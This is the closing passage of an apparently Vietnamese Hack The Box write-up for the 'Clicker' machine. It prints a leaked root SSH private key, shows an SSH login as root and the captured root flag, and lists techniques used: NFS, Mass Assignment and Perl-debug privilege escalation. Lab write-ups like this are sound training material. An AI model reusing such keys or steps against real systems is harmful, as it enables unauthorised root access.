dzi2f1afP00ohoXJ8LfcgL8l6P3avPG+j1E4+7vFAAAFiJPiVMyT4lTMAAAAB3NzaC1yc2
EAAAGBAJkAVhg79Z+bQDwbtkPw7EQiGaD4bYUvE/rqGGugi/oCrSSRqJPMQpS4yUUA5uMN
osUx7odqbfcCuXuDLO+4N9dH353gokbcZn3ImEzvOFOzTCmgOM92KLqXVsBaCDUPVMAiIr
/Ku250X6ubRmFbrcYBVCl+W5WYwKkUWwa0ZrRFt+W5UOnQdsmC/nq1Ef7tujyOmHcI9dte
pVBeqdKKZ8zkOlTzuRadIUsey5z2tgKEw7o9dtoCmsnknolfoXerUDf3bfqpBLkSEMOkqY
zdCDUi3SrR/Ja25DqgeEyr4N2tyKu6HMSVbOVDQ2ZYd/u0epcDh9oi+K9U36P/yCapIrDP
x+3VFBzyOsRoDn18UseI+v6Y/mGQ6jjctombkD2at44+ShhkGxDrKSGV4ipnT1aUcCCxZj
nk8SNk+cIt4xK3xwhoXIzrv2y868KW2bjsVgdWsOfBd8QUkoZo9TKJ8632/Hc4tn9Wnz9N
KIaFyfC33IC/Jej92rzxvo9ROPu7xQAAAAMBAAEAAAGAE36LubRAEElBdrcoMsFqdSbsIY
qtt6u/LbfwixwOYblAEtn9QvGiZR0jRee+w1zMKbh6NiZNIw0lkXNuARA1izhE6XKC8qjn
5SxvHVRYlq+Qa3hW7LYXK+kW/FSsWYhdyco/p7S+y2zH+M9EuShrfIBUVyIarLWlDJYDoB
fRwzPj4cEKKnRtgjDu2DckdxkWotsfWYFahAwr35DkLeeFIMHOnd7c7SDxqkbe9h2oJKuC
XcMxlscArmsy+Plmkx8QW9XbjvCxFzHUPJQpIjNOwKqmrNbE1VJZur0+jpOJaW8a2pf0yX
3dZJhOgyux8fGDvUbykqvronHBYo2jGhcGusZuzVhIL9Q/8a8QuR9GU4xMRM5iHEUy7sQT
JC1Z6rURNH69NjnGh0JvEw0Edh8rzBFxs6cHxoaGj7HK4RvzqPHDOXwDuiSblfTnPyfSl6
yv5WokfgiE8nl4hVAj4zXn36dSOAnPOkG5Z87C5fmvmTnow1/P3qdMpersFcFsoEKpAAAA
wC6wAaF+/1zEP5wBZTLK+4XSdneHB2Li1wrr1yQrstZZom4+jytZ1Ua2SyMHlH73NQmyA9
kPhC0v+1h6AJ5OHMSz+38BPRUb4wZqGZbhIClHlq5LuP1/Fl6lKaAMFzRA3nawCYoevDXb
vw+PTc0cEsa2T7IVsHRmF3Jgtq8QfRvjbtQGbsEOtkLwYcMjrxokBptzuX6iK4QCLhbg4i
MexcYZn6ZkVbFCmec8pNfkgIrT/tT3jNODoDr0+nztKJIARgAAAMEAxF99ZdR61WPMDS/6
AdY46sq2ppsavIhThs23pUzbBQ2eCdwJFLjXdZGP+u4+1dabFev4biX1xGUGE0RzQyNsxA
oeS8NMqSwNppFCXMAvm7hhAFlIP/PYDaERYf4xZ7KTgr5VEk4tiiYI6Sbc6Ni1B9MnE/PF
ZDuyDXKUTuHuzarDk/fMcRs6sdwWgamVp4oGcQ9/y3OZBAJsXholRq1GSIMpV1oc4bAf+1
WLi8Bi20tPha2DCTn3HdI0jHY1hBDtAAAAwQDHdXfnPQEHaDucNU9CSviWUyxlOJn47Q5C
MOinABtUnOCYalb/Z/7sWaQLoETyaKulN2sSyi3Zs/UeAn29rdT05iw98j8jAhibydzWmM
piUBjzkVE7XUAoFyB9qeQqFfoSkXLeCBvVfChmHGXBOix789bijGy82YmTzSztmnXg7Ml5
MxxRLe7vJmt/c4I2Fo+gwwlnQxY7vTopHYgGmhf/ywEEC/ckmYQpfy7lRwV8xWenZNV7wx
UyOYOJc1Mv8zkAAAAMcm9vdEBjbGlja2VyAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----

</file>
```
- SSH vào quyền root thôi :))) 
```
ubuntu@m41n:~/HTB/clicker$ ssh -i root_key root@10.129.249.49
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Mar 22 07:15:03 PM UTC 2025

  System load:           0.0
  Usage of /:            53.4% of 5.77GB
  Memory usage:          17%
  Swap usage:            0%
  Processes:             247
  Users logged in:       1
  IPv4 address for eth0: 10.129.249.49
  IPv6 address for eth0: dead:beef::250:56ff:feb9:5516


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@clicker:~# ls
diagnostic_files  restore  root.txt
root@clicker:~# id
uid=0(root) gid=0(root) groups=0(root)
root@clicker:~# cat root.txt
daf60f4adde14a8f23cde98e7cb4e1bf
root@clicker:~#
```
# 📒 Highlights
- port 2049 NFS
- Chú ý lỗ hổng Mass Assignment khi cập nhật thông tin
- khi có code chạy Perl5 có thể lợi dụng perl debug để nâng quyền 